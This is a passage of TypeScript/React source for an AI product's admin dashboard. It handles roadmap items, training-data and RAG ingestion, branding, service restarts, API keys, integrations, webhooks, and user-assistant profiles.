      addNotification({ type: "success", message: "Market readiness config saved." });
      await refreshMarketReadiness();
    }
  };

  const refreshFrontierProgram = async () => {
    if (!canAccessAdminOps) return;
    const [programData, readinessData] = await Promise.all([
      callAction("GET:/admin/frontier-program", {}),
      callAction("GET:/admin/frontier-program/readiness", {}),
    ]);
    if (programData?.program) setBackendOutput(programData);
    if (readinessData?.readiness) setBackendOutput(readinessData);
  };

  const upsertFrontierItemFromDashboard = async () => {
    const id = frontierItemId.trim();
    if (!id) {
      addNotification({ type: "warn", message: "Enter an item ID (example: model_core_01)." });
      return;
    }
    const data = await callAction("/admin/frontier-program/item", {
      id,
      owner: frontierItemOwner.trim() || "founder",
      status: frontierItemStatus,
      priority: frontierItemPriority,
      notes: frontierItemNotes,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Frontier item updated: ${id}` });
      await refreshFrontierProgram();
    }
  };

  const bulkUpdateFrontierItemsFromDashboard = async () => {
    const ids = frontierBulkIds
      .split(/[\n,\s]+/)
      .map((s) => s.trim())
      .filter(Boolean);
    if (ids.length === 0) {
      addNotification({ type: "warn", message: "Enter one or more item IDs for bulk update." });
      return;
    }
    const data = await callAction("/admin/frontier-program/items/bulk", {
      ids,
      status: frontierBulkStatus,
      owner: frontierItemOwner.trim() || undefined,
      priority: frontierItemPriority,
      notes: frontierItemNotes,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Bulk updated ${ids.length} frontier items.` });
      await refreshFrontierProgram();
    }
  };

  const upsertFrontierMilestoneFromDashboard = async () => {
    const id = frontierMilestoneId.trim();
    if (!id) {
      addNotification({ type: "warn", message: "Enter a milestone ID." });
      return;
    }
    const criteria = frontierMilestoneCriteria
      .split(/\n+/)
      .map((s) => s.trim())
      .filter(Boolean);
    const data = await callAction("/admin/frontier-program/milestone", {
      id,
      name: frontierMilestoneName.trim() || id,
      quarter: frontierMilestoneQuarter.trim() || "Q4-2026",
      owner: frontierMilestoneOwner.trim() || "founder",
      status: frontierMilestoneStatus,
      successCriteria: criteria,
    });
    if (data?.success) {
      addNotification({ type: "success", message: `Milestone updated: ${id}` });
      await refreshFrontierProgram();
    }
  };

  const resetFrontierProgramFromDashboard = async () => {
    if (!isFounderUser()) {
      addNotification({ type: "error", message: "Only founder can reset frontier program." });
      return;
    }
    const data = await callAction("/admin/frontier-program/reset", {});
    if (data?.success) {
      addNotification({ type: "success", message: "Frontier program reset to default roadmap." });
      await refreshFrontierProgram();
    }
  };

  const autoRefreshLocalLabel = useMemo(() => {
    const hourUtc = Math.max(0, Math.min(23, Number(autoRefreshHourUtc || 0)));
    const minuteUtc = Math.max(0, Math.min(59, Number(autoRefreshMinuteUtc || 0)));
    const utcDate = new Date(Date.UTC(2026, 0, 1, hourUtc, minuteUtc, 0, 0));
    const local = utcDate.toLocaleString(undefined, {
      weekday: "short",
      hour: "2-digit",
      minute: "2-digit",
      timeZoneName: "short",
    });
    const hh = String(hourUtc).padStart(2, "0");
    const mm = String(minuteUtc).padStart(2, "0");
    return `UTC ${hh}:${mm} → Local ${local}`;
  }, [autoRefreshHourUtc, autoRefreshMinuteUtc]);

  const trainingStudioCard = (
    <Card title="NeuroEdge Training Studio (Founder/Admin)">
      <div style={{ display: "grid", gap: 8 }}>
        <input value={trainingTitle} onChange={(e) => setTrainingTitle(e.target.value)} placeholder="Dataset title" style={input} />
        <textarea value={trainingText} onChange={(e) => setTrainingText(e.target.value)} placeholder="Paste raw training text, policy docs, instructions..." style={{ ...input, minHeight: 90 }} />
        <input value={trainingTagsCsv} onChange={(e) => setTrainingTagsCsv(e.target.value)} placeholder="Tags (comma-separated)" style={input} />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={ ingestTrainingText }>Ingest Text</button>
          <button style={chip} onClick={() => { setTrainingTitle("Founder Training Note"); setTrainingText(""); }}>Clear Text</button>
        </div>

        <textarea value={trainingUrls} onChange={(e) => setTrainingUrls(e.target.value)} placeholder={"URL list (one per line)\nhttps://example.com/a\nhttps://example.com/b"} style={{ ...input, minHeight: 90 }} />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={ingestTrainingUrls}>Ingest URLs (crawl text)</button>
          <input value={trainingResearchQuery} onChange={(e) => setTrainingResearchQuery(e.target.value)} placeholder="Research query for dataset generation" style={{ ...input, minWidth: 220 }} />
          <button style={chip} onClick={ingestTrainingResearch}>Ingest Research Query</button>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <label style={chip}>
            Upload Files
            <input type="file" multiple style={{ display: "none" }} onChange={(e) => prepareTrainingFiles(e.target.files)} />
          </label>
          <label style={chip}>
            Upload Folder
            <input
              type="file"
              multiple
              {...({ webkitdirectory: "" } as any)}
              style={{ display: "none" }}
              onChange={(e) => prepareTrainingFiles(e.target.files)}
            />
          </label>
          <label style={chip}>
            Upload Zip/PDF
            <input type="file" multiple accept=".zip,.pdf" style={{ display: "none" }} onChange={(e) => prepareTrainingFiles(e.target.files)} />
          </label>
          <button style={primary} onClick={ingestTrainingFiles}>Ingest Prepared Files</button>
          <button style={chip} onClick={() => setTrainingUploadFiles([])}>Clear Prepared</button>
        </div>
        <div style={muted}>Prepared files: {trainingUploadFiles.length}. Supports files, folders, zip, pdf, and mixed datasets.</div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, dedupe: !p.dedupe }))}>Dedupe: {trainingOptions.dedupe ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, piiFilter: !p.piiFilter }))}>PII Filter: {trainingOptions.piiFilter ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, autoTag: !p.autoTag }))}>Auto-tag: {trainingOptions.autoTag ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, semanticChunking: !p.semanticChunking }))}>Chunking: {trainingOptions.semanticChunking ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, crawlLinks: !p.crawlLinks }))}>Crawl Links: {trainingOptions.crawlLinks ? "on" : "off"}</button>
          <button style={chip} onClick={() => setTrainingOptions((p) => ({ ...p, citationMode: !p.citationMode }))}>Citation Mode: {trainingOptions.citationMode ? "on" : "off"}</button>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
          <select value={ragDomain} onChange={(e) => setRagDomain(e.target.value as any)} style={input}>
            <option value="general">RAG domain: general</option>
            <option value="medicine">RAG domain: medicine</option>
            <option value="agriculture">RAG domain: agriculture</option>
            <option value="market">RAG domain: market</option>
          </select>
          <input value={ragQuery} onChange={(e) => setRagQuery(e.target.value)} placeholder="Ask indexed RAG knowledge..." style={{ ...input, minWidth: 260 }} />
          <button style={primary} onClick={ragIngestQuick}>Ingest to RAG</button>
          <button style={chip} onClick={ragBootstrapFromTraining}>Bootstrap RAG from Training</button>
          <button style={chip} onClick={runTrustedBootstrapPack}>Trusted Seed Pack (One-Click)</button>
          <button style={chip} onClick={() => setBootstrapIncludeSecondary((v) => !v)}>
            Secondary Sources: {bootstrapIncludeSecondary ? "on" : "off"}
          </button>
          <button style={chip} onClick={runNightlyRefreshNow}>Run Nightly Refresh Now</button>
          <button style={chip} onClick={() => callAction("GET:/admin/training/bootstrap-pack/auto-refresh/status", {}).then((d) => setBackendOutput(d))}>
            Auto-Refresh Status
          </button>
          <button style={chip} onClick={ragAsk}>Ask RAG</button>
          <button style={chip} onClick={() => callAction("/rag/reindex", {}).then((d) => setBackendOutput(d))}>Reindex RAG</button>
          <button style={chip} onClick={() => callAction("GET:/admin/training/bootstrap-pack/list", {}).then((d) => setBackendOutput(d))}>View Trusted Sources</button>
          <button style={chip} onClick={() => callAction("GET:/rag/stats", {}).then((d) => setBackendOutput(d))}>RAG Stats</button>
        </div>

        <div style={{ border: "1px solid rgba(148,163,184,0.2)", borderRadius: 12, padding: 10, display: "grid", gap: 8 }}>
          <div style={{ fontWeight: 600 }}>Auto-Refresh Config</div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
            <button style={chip} onClick={() => setAutoRefreshEnabled((v) => !v)}>
              Enabled: {autoRefreshEnabled ? "on" : "off"}
            </button>
            <input
              value={autoRefreshHourUtc}
              onChange={(e) => setAutoRefreshHourUtc(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Hour UTC (0-23)"
              style={{ ...input, width: 140 }}
            />
            <input
              value={autoRefreshMinuteUtc}
              onChange={(e) => setAutoRefreshMinuteUtc(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Minute UTC (0-59)"
              style={{ ...input, width: 150 }}
            />
            <input
              value={autoRefreshStaleHours}
              onChange={(e) => setAutoRefreshStaleHours(e.target.value.replace(/[^\d]/g, ""))}
              placeholder="Stale hours (>=12)"
              style={{ ...input, width: 150 }}
            />
            <button style={primary} onClick={saveAutoRefreshConfig}>Save Config</button>
            <button style={chip} onClick={loadAutoRefreshStatus}>Load Status</button>
          </div>
          <div style={{ color: "rgba(148,163,184,0.95)", fontSize: 12 }}>
            Timezone helper: {autoRefreshLocalLabel}
          </div>
        </div>

        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select value={trainingJobMode} onChange={(e) => setTrainingJobMode(e.target.value as any)} style={input}>
            <option value="incremental">incremental</option>
            <option value="full">full</option>
            <option value="eval_only">eval_only</option>
          </select>
          <select value={trainingEvalSuite} onChange={(e) => setTrainingEvalSuite(e.target.value as any)} style={input}>
            <option value="core">core</option>
            <option value="math">math</option>
            <option value="code">code</option>
            <option value="research">research</option>
            <option value="all">all</option>
          </select>
          <button style={primary} onClick={queueTrainingJob}>Queue Training Job</button>
          <button style={chip} onClick={loadTrainingOverview}>Refresh Overview</button>
          <button style={chip} onClick={() => window.open(`${apiBase}/training/export?limit=10000`, "_blank")}>Export JSONL</button>
        </div>
      </div>
      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 260, overflow: "auto" }}>
        {trainingOverview ? JSON.stringify(trainingOverview, null, 2) : "No training overview yet."}
      </pre>
    </Card>
  );

  const readImageAsDataUrl = (file: File) =>
    new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result || ""));
      reader.onerror = () => reject(reader.error);
      reader.readAsDataURL(file);
    });

  const onBrandAssetUpload = async (
    kind: "logoUrl" | "iconUrl" | "faviconUrl" | "mainChatBackgroundUrl" | "floatingChatBackgroundUrl" | "loginBackgroundUrl",
    files: FileList | null
  ) => {
    const file = files?.[0];
    if (!file) return;
    if (!file.type.startsWith("image/")) {
      addNotification({ type: "error", message: "Please upload an image file." });
      return;
    }
    try {
      const dataUrl = await readImageAsDataUrl(file);
      setBrandingDraft((prev) => ({ ...prev, [kind]: dataUrl }));
      addNotification({ type: "success", message: `${kind.replace("Url", "")} selected.` });
    } catch {
      addNotification({ type: "error", message: "Failed to read image." });
    }
  };

  const saveBrandingSettings = () => {
    const next: BrandingConfig = {
      productName: brandingDraft.productName.trim() || defaultBranding.productName,
      logoUrl: brandingDraft.logoUrl || defaultBranding.logoUrl,
      iconUrl: brandingDraft.iconUrl || defaultBranding.iconUrl,
      faviconUrl: brandingDraft.faviconUrl || brandingDraft.iconUrl || defaultBranding.faviconUrl,
      mainChatBackgroundUrl: brandingDraft.mainChatBackgroundUrl || "",
      floatingChatBackgroundUrl: brandingDraft.floatingChatBackgroundUrl || "",
      loginBackgroundUrl: brandingDraft.loginBackgroundUrl || "",
      mainChatOverlayOpacity: Number(brandingDraft.mainChatOverlayOpacity || defaultBranding.mainChatOverlayOpacity),
      floatingOverlayOpacity: Number(brandingDraft.floatingOverlayOpacity || defaultBranding.floatingOverlayOpacity),
      loginOverlayOpacity: Number(brandingDraft.loginOverlayOpacity || defaultBranding.loginOverlayOpacity),
      accentColor: brandingDraft.accentColor || defaultBranding.accentColor,
      glassBlur: Number(brandingDraft.glassBlur || defaultBranding.glassBlur),
    };
    saveBranding(next);
    applyBrandingToDocument(next);
    addNotification({ type: "success", message: "Branding updated across app." });
  };

  const requestServiceRestart = async (service: "kernel" | "ml" | "orchestrator" | "frontend") => {
    if (!confirmSafeAction({ title: `${service} service`, actionLabel: "restart" })) return;
    const reason = window.prompt(`Reason for restarting ${service}:`, "Emergency maintenance");
    if (!reason || reason.trim().length < 8) {
      addNotification({ type: "error", message: "Restart reason is required (min 8 characters)." });
      return;
    }
    const urgencyInput = (window.prompt("Urgency: emergency | high | normal | low", "normal") || "normal").trim().toLowerCase();
    const urgency = ["emergency", "high", "normal", "low"].includes(urgencyInput) ? urgencyInput : "normal";
    try {
      const data = await postJson("/admin/restart", {
        service,
        confirm: true,
        reason: reason.trim(),
        urgency,
      });
      addNotification({
        type: "info",
        message: data?.scheduledAt
          ? `Restart queued for maintenance window (${new Date(data.scheduledAt).toLocaleString()}).`
          : (data?.message || `Restart requested for ${service}`),
      });
    } catch (err: any) {
      addNotification({ type: "error", message: `Restart request failed: ${err?.message || err}` });
    }
  };

  const inspectRuntimeUnit = (unit: RuntimeUnit) => {
    setSelectedRuntimeUnit(unit);
    setBackendOutput({
      type: "runtime_unit_inspection",
      inspectedAt: Date.now(),
      unit,
      serviceStatus: runtimeServiceState[unit.domain],
      recommendation: unit.suggestedFix,
    });
  };

  const runRuntimeDiagnostics = async (domain: RuntimeDomain) => {
    if (domain === "kernel") {
      await runBackendAction("GET:/kernels");
      return;
    }
    if (domain === "ml") {
      await runBackendAction("GET:/system/status");
      await runBackendAction("GET:/admin/reliability/overview?windowHours=24");
      return;
    }
    if (domain === "orchestrator") {
      await runBackendAction("GET:/status");
      await runBackendAction("GET:/admin/logs?limit=50");
      return;
    }
    await runBackendAction("GET:/health");
    await runBackendAction("GET:/admin/logs?limit=50");
  };

  const runRuntimeAutoFix = async (domain: RuntimeDomain) => {
    if (domain === "frontend") {
      await runBackendAction("/self-expansion/propose", {
        goal: "frontend runtime stabilization and unresolved client error hardening",
      });
      return;
    }
    await requestServiceRestart(domain);
  };

  const addDevApiKey = async () => {
    const name = window.prompt("API key name:", "New API Key");
    if (!name) return;
    await callAction("/admin/dashboard/api-keys/create", { name: name.trim() });
    addNotification({ type: "success", message: "API key created." });
  };

  const addWebhook = async () => {
    if (!devWebhook.trim()) {
      addNotification({ type: "error", message: "Enter a webhook URL first." });
      return;
    }
    await callAction("/admin/dashboard/webhooks/upsert", {
      webhook: { url: devWebhook.trim(), event: webhookEvent, active: true },
    });
    addNotification({ type: "success", message: "Webhook added." });
  };

  const createIntegration = async () => {
    const appName = integrationDraft.appName.trim();
    if (!appName) {
      addNotification({ type: "error", message: "App name is required." });
      return;
    }
    const scopes = integrationDraft.scopesCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const allowedOrigins = integrationDraft.originsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const body = {
      integration: {
        appName,
        appDescription: integrationDraft.appDescription.trim(),
        environment: integrationDraft.environment,
        scopes: scopes.length ? scopes : ["chat:write"],
        allowedOrigins,
        webhookUrl: integrationDraft.webhookUrl.trim(),
        rateLimitPerMin: Number(integrationDraft.rateLimitPerMin || 120),
      },
    };
    const data = await callAction("/admin/dashboard/integrations/upsert", body);
    if (data?.apiKey) {
      setLatestGeneratedApiKey(String(data.apiKey));
      addNotification({ type: "success", message: "Integration created. Copy API key now." });
    }
  };

  const createConnectorPreset = async (preset: "github" | "google_drive" | "slack" | "notion") => {
    const map: Record<typeof preset, Partial<IntegrationApp> & { scopes: string[]; origins: string[]; webhook?: string }> = {
      github: {
        appName: "GitHub Connector",
        appDescription: "Repository browsing, issue context, and commit metadata sync.",
        environment: "production",
        scopes: ["chat:write", "ai:infer", "execute:run"],
        origins: ["https://github.com"],
      },
      google_drive: {
        appName: "Google Drive Connector",
        appDescription: "Document retrieval and workspace file context.",
        environment: "production",
        scopes: ["chat:write", "ai:infer"],
        origins: ["https://drive.google.com"],
      },
      slack: {
        appName: "Slack Connector",
        appDescription: "Channel summaries, incident updates, and workflow triggers.",
        environment: "production",
        scopes: ["chat:write", "ai:infer"],
        origins: ["https://slack.com"],
      },
      notion: {
        appName: "Notion Connector",
        appDescription: "Page knowledge retrieval and project documentation sync.",
        environment: "production",
        scopes: ["chat:write", "ai:infer"],
        origins: ["https://www.notion.so"],
      },
    };
    const cfg = map[preset];
    const body = {
      integration: {
        appName: cfg.appName,
        appDescription: cfg.appDescription,
        environment: cfg.environment,
        scopes: cfg.scopes,
        allowedOrigins: cfg.origins,
        rateLimitPerMin: 120,
        webhookUrl: cfg.webhook,
      },
    };
    const data = await callAction("/admin/dashboard/integrations/upsert", body);
    if (data?.success) {
      addNotification({ type: "success", message: `${cfg.appName} created.` });
    }
  };

  const requestPaidIntegrationKey = async () => {
    const appName = integrationDraft.appName.trim();
    if (!appName) {
      addNotification({ type: "error", message: "App name is required." });
      return;
    }
    const scopes = integrationDraft.scopesCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const allowedOrigins = integrationDraft.originsCsv
      .split(",")
      .map((s) => s.trim())
      .filter(Boolean);
    const data = await callAction("/dashboard/integrations/request-key", {
      appName,
      appDescription: integrationDraft.appDescription.trim(),
      environment: integrationDraft.environment,
      scopes: scopes.length ? scopes : ["chat:write"],
      allowedOrigins,
      webhookUrl: integrationDraft.webhookUrl.trim(),
      rateLimitPerMin: Number(integrationDraft.rateLimitPerMin || 60),
    });
    if (data?.apiKey) {
      setLatestGeneratedApiKey(String(data.apiKey));
      addNotification({ type: "success", message: "Paid key issued. Copy API key now." });
    }
  };

  const clearDomainLinkDraft = () => {
    setDomainLinkDraft({
      id: "",
      name: "",
      url: "",
      type: "public",
      environment: "production",
      audience: "users",
      status: "active",
      description: "",
      tagsCsv: "",
      owner: "",
      notes: "",
    });
  };

  const upsertDomainLink = async () => {
    const name = domainLinkDraft.name.trim();
    const url = domainLinkDraft.url.trim();
    if (!name || !url) {
      addNotification({ type: "error", message: "Enter link name and URL." });
      return;
    }
    const tags = domainLinkDraft.tagsCsv
      .split(",")
      .map((t) => t.trim())
      .filter(Boolean);
    const data = await callAction("/admin/dashboard/links/upsert", {
      link: {
        id: domainLinkDraft.id || undefined,
        name,
        url,
        type: domainLinkDraft.type,
        environment: domainLinkDraft.environment,
        audience: domainLinkDraft.audience,
        status: domainLinkDraft.status,
        description: domainLinkDraft.description.trim(),
        tags,
        owner: domainLinkDraft.owner.trim(),
        notes: domainLinkDraft.notes.trim(),
      },
    });
    if (data?.success) {
      clearDomainLinkDraft();
      addNotification({ type: "success", message: "Domain/link saved." });
    }
  };

  const editDomainLink = (link: DomainLink) => {
    setDomainLinkDraft({
      id: link.id,
      name: link.name,
      url: link.url,
      type: link.type,
      environment: link.environment,
      audience: link.audience,
      status: link.status,
      description: link.description || "",
      tagsCsv: Array.isArray(link.tags) ? link.tags.join(", ") : "",
      owner: link.owner || "",
      notes: link.notes || "",
    });
  };

  const toggleDomainLink = async (id: string) => {
    await callAction("/admin/dashboard/links/toggle", { id });
  };

  const verifyDomainLink = async (id: string) => {
    const data = await callAction("/admin/dashboard/links/verify", { id });
    if (!data) return;
    if (data.reachable) {
      addNotification({ type: "success", message: `Link verified (${data.status}).` });
    } else {
      addNotification({ type: "warn", message: `Link not reachable: ${data.error || data.status || "unknown"}` });
    }
  };

  const testWebhook = async (id: string) => {
    const hook = webhooks.find((w) => w.id === id);
    if (!hook) return;
    await callAction("/admin/dashboard/webhooks/test", { id });
    addNotification({ type: "info", message: `Webhook test sent to ${hook.url}` });
  };

  const addSupportTicket = async () => {
    const subject = newTicket.trim();
    if (!subject) return;
    await callAction("/admin/dashboard/tickets/upsert", {
      ticket: { subject, priority: "medium", status: "open", assignee: "unassigned" },
    });
    setNewTicket("");
    addNotification({ type: "success", message: "Support ticket created." });
  };

  const addAgentProfile = async () => {
    const name = window.prompt("Agent name:", "New Agent");
    if (!name) return;
    await callAction("/admin/dashboard/agents/upsert", {
      agent: {
        name: name.trim(),
        memoryDays: 30,
        tools: ["chat"],
        permission: "workspace",
      },
    });
  };

  const addSavedPrompt = async () => {
    if (!newPromptTitle.trim() || !newPromptText.trim()) {
      addNotification({ type: "error", message: "Add prompt title and text." });
      return;
    }
    if (canAccessAdminOps) {
      await callAction("/admin/dashboard/prompts/upsert", {
        prompt: { title: newPromptTitle.trim(), text: newPromptText.trim() },
      });
    } else {
      setSavedPrompts((prev) => [
        {
          id: `sp-${Date.now()}`,
          title: newPromptTitle.trim(),
          text: newPromptText.trim(),
        },
        ...prev,
      ]);
    }
    setNewPromptTitle("");
    setNewPromptText("");
    addNotification({ type: "success", message: "Prompt saved." });
  };

  const selectedAgent = agentsLocal.find((a) => a.id === selectedAgentId) || null;
  const selectedUserAssistant =
    userAssistants.find((a) => a.id === selectedUserAssistantId) || null;

  const updateAgent = async (id: string, patch: Partial<AgentProfile>) => {
    const current = agentsLocal.find((a) => a.id === id);
    if (!current) return;
    await callAction("/admin/dashboard/agents/upsert", { agent: { ...current, ...patch, id } });
  };

  const toggleAgentTool = async (id: string, tool: string) => {
    const current = agentsLocal.find((a) => a.id === id);
    if (!current) return;
    const has = current.tools.includes(tool);
    const tools = has ? current.tools.filter((t) => t !== tool) : [...current.tools, tool];
    await callAction("/admin/dashboard/agents/upsert", { agent: { ...current, tools, id } });
  };

  const addUserAssistant = () => {
    const now = Date.now();
    const next: UserAssistantProfile = {
      id: `ua-${now}`,
      name: "My Assistant",
      rolePrompt: "Helpful personal assistant customized for my workflow.",
      tone: "balanced",
      language: "en",
      responseMode: "balanced",
      domainFocus: "general",
      startupPrompt: "",
      avatarEmoji: "✨",
      creativity: 0.4,
      memoryDays: 14,
      memoryMode: "long_term",
      autoCitations: false,
      tools: ["chat", "research"],
      privacyMode: true,
      safeMode: true,
      createdAt: now,
      updatedAt: now,
    };
    setUserAssistants((prev) => [next, ...prev]);
    setSelectedUserAssistantId(next.id);
    addNotification({ type: "success", message: "New personal assistant created." });
  };

  const updateUserAssistant = (id: string, patch: Partial<UserAssistantProfile>) => {
    setUserAssistants((prev) =>
      prev.map((a) =>
        a.id === id ? { ...a, ...patch, updatedAt: Date.now() } : a
      )
    );
  };

  const toggleUserAssistantTool = (id: string, tool: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    const has = current.tools.includes(tool);
    const tools = has ? current.tools.filter((t) => t !== tool) : [...current.tools, tool];
    updateUserAssistant(id, { tools });
  };

  const duplicateUserAssistant = (id: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    const now = Date.now();
    const next: UserAssistantProfile = {
      ...current,
      id: `ua-${now}`,
      name: `${current.name} Copy`,
      createdAt: now,
      updatedAt: now,
    };
    setUserAssistants((prev) => [next, ...prev]);
    setSelectedUserAssistantId(next.id);
    addNotification({ type: "success", message: "Assistant duplicated." });
  };

  const deleteUserAssistant = (id: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    if (!confirmSafeAction({ title: `assistant ${current.name}`, actionLabel: "delete", chatMode: true })) return;
    setUserAssistants((prev) => prev.filter((a) => a.id !== id));
    if (selectedUserAssistantId === id) setSelectedUserAssistantId("");
    if (defaultUserAssistantId === id) setDefaultUserAssistantId("");
    addNotification({ type: "warn", message: `Removed assistant ${current.name}.` });
  };

  const activateUserAssistant = (id: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    try {
      localStorage.setItem("neuroedge_active_user_assistant_v1", JSON.stringify(current));
      window.dispatchEvent(
        new CustomEvent("neuroedge:userAssistantUpdated", { detail: current })
      );
      addNotification({ type: "success", message: `${current.name} is now active for chat.` });
    } catch {
      addNotification({ type: "error", message: "Failed to activate assistant." });
    }
  };

  const setDefaultUserAssistant = (id: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    setDefaultUserAssistantId(id);
    addNotification({ type: "success", message: `${current.name} set as startup assistant.` });
  };

  const exportUserAssistant = (id: string) => {
    const current = userAssistants.find((a) => a.id === id);
    if (!current) return;
    exportData(`${current.name.replace(/\s+/g, "_").toLowerCase()}_assistant_profile`, current);
  };

  const importUserAssistant = async (files: FileList | null) => {
    const file = files?.[0];
    if (!file) return;
    try {
      const raw = await file.text();
      const parsed = JSON.parse(raw) as Partial<UserAssistantProfile>;
      if (!parsed?.name) {
        addNotification({ type: "error", message: "Invalid assistant profile file." });
        return;
      }
      const now = Date.now();
      const next: UserAssistantProfile = {
        id: `ua-${now}`,
        name: String(parsed.name),
        rolePrompt: String(parsed.rolePrompt || "Helpful personal assistant."),
        tone: (parsed.tone as UserAssistantProfile["tone"]) || "balanced",
        language: String(parsed.language || "en"),
        responseMode:
          (parsed.responseMode as UserAssistantProfile["responseMode"]) || "balanced",
        domainFocus: String(parsed.domainFocus || "general"),
        startupPrompt: String(parsed.startupPrompt || ""),
        avatarEmoji: String(parsed.avatarEmoji || "🤖"),
        creativity: Number(parsed.creativity ?? 0.4),
        memoryDays: Number(parsed.memoryDays ?? 14),
        memoryMode:
          (parsed.memoryMode as UserAssistantProfile["memoryMode"]) || "long_term",
        autoCitations: parsed.autoCitations === true,
        tools: Array.isArray(parsed.tools) ? parsed.tools.map((t) => String(t)) : ["chat"],
        privacyMode: parsed.privacyMode !== false,
        safeMode: parsed.safeMode !== false,
        createdAt: now,
        updatedAt: now,
      };
      setUserAssistants((prev) => [next, ...prev]);
      setSelectedUserAssistantId(next.id);
      addNotification({ type: "success", message: "Assistant profile imported." });
    } catch {
      addNotification({ type: "error", message: "Failed to import assistant profile JSON." });
    }
  };

  const currentUserLabel = () => {
    try {
      const rawUser = localStorage.getItem("neuroedge_user");
      if (!rawUser) return "local-user";
      const parsed = JSON.parse(rawUser);
      return String(parsed?.name || parsed?.email || "local-user");
    } catch {
      return "local-user";
    }
  };

  const addKnowledgeUrlToAssistant = () => {
    const current = selectedUserAssistant;
    const url = assistantKnowledgeUrlDraft.trim();
    if (!current || !url) return;
    const nextSources = Array.from(new Set([...(current.knowledgeSources || []), url]));
    updateUserAssistant(current.id, { knowledgeSources: nextSources });
    setAssistantKnowledgeUrlDraft("");
    addNotification({ type: "success", message: "Knowledge URL added to assistant." });
  };

  const removeKnowledgeUrlFromAssistant = (url: string) => {
    const current = selectedUserAssistant;
    if (!current) return;
    updateUserAssistant(current.id, {
      knowledgeSources: (current.knowledgeSources || []).filter((u) => u !== url),
    });
  };

  const attachKnowledgeFilesToAssistant = (files: FileList | null) => {
    const current = selectedUserAssistant;
    if (!current || !files || files.length === 0) return;
    const incoming = Array.from(files).map((f) => ({
      id: `akf-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      name: f.name,
      size: f.size,
      mime: f.type || "application/octet-stream",
      addedAt: Date.now(),
    }));
    updateUserAssistant(current.id, {
      knowledgeFiles: [...(current.knowledgeFiles || []), ...incoming],
    });
    addNotification({ type: "success", message: `Attached ${incoming.length} knowledge file(s).` });
  };

  const removeKnowledgeFileFromAssistant = (fileId: string) => {
    const current = selectedUserAssistant;
    if (!current) return;
    updateUserAssistant(current.id, {
      knowledgeFiles: (current.knowledgeFiles || []).filter((f) => f.id !== fileId),
    });
  };

  const publishAssistantPack = () => {
    const current = selectedUserAssistant;
    if (!current) return;
    const tags = marketplaceTagsCsv
      .split(",")
      .map((t) => t.trim())
      .filter(Boolean);
    const now = Date.now();
    const owner = currentUserLabel();
    const nextPack: AssistantMarketplacePack = {
      id: `amp-${now}-${Math.random().toString(36).slice(2, 8)}`,
      owner,
      name: current.name,
      description: marketplaceDescription.trim() || `Assistant pack: ${current.name}`,
      visibility: marketplaceVisibility,
      tags,
      downloads: 0,
      rating: 0,
      updatedAt: now,
      assistant: { ...current, updatedAt: now },
    };
    setAssistantMarketplace((prev) => [nextPack, ...prev]);
    addNotification({ type: "success", message: `${current.name} published to marketplace.` });
  };

  const installAssistantPack = (packId: string) => {
    const pack = assistantMarketplace.find((p) => p.id === packId);
    if (!pack) return;
    const now = Date.now();
    const next: UserAssistantProfile = {
      ...pack.assistant,
      id: `ua-${now}`,
      name: `${pack.assistant.name}`,
      createdAt: now,
      updatedAt: now,
    };
    setUserAssistants((prev) => [next, ...prev]);
    setSelectedUserAssistantId(next.id);
    setAssistantMarketplace((prev) =>
      prev.map((p) =>
        p.id === packId
          ? {
              ...p,
              downloads: (p.downloads || 0) + 1,
              updatedAt: now,
            }
          : p
      )
    );
    addNotification({ type: "success", message: `Installed ${pack.name} from marketplace.` });
  };

  const rateAssistantPack = (packId: string, stars: number) => {
    const rating = Math.max(1, Math.min(5, stars));
    setAssistantMarketplace((prev) =>
      prev.map((p) =>
        p.id === packId
          ? {
              ...p,
              rating: Number((((p.rating || 0) + rating) / 2).toFixed(2)),
              updatedAt: Date.now(),
            }
          : p
      )
    );
  };

  const filteredMarketplacePacks = assistantMarketplace.filter((p) => {
    const q = marketplaceSearch.trim().toLowerCase();
    if (!q) return true;
    return (
      p.name.toLowerCase().includes(q) ||
      p.description.toLowerCase().includes(q) ||
      p.tags.join(" ").toLowerCase().includes(q) ||
      p.owner.toLowerCase().includes(q)
    );
  });

  const assistantQualityScore = (assistantId: string) => {
    const a = assistantAnalytics[assistantId];
    if (!a) return 0;
    const sentimentBase = a.turns > 0 ? (a.up + a.laugh - a.down - a.sad) / a.turns : 0;
    const confidence = Number.isFinite(a.avgConfidence) ? a.avgConfidence : 0;
    const coverage = Number.isFinite(a.citationCoverage) ? a.citationCoverage : 0;
    const score = (0.5 * confidence + 0.3 * coverage + 0.2 * (0.5 + sentimentBase / 2)) * 100;
    return Math.max(0, Math.min(100, Number(score.toFixed(1))));
  };

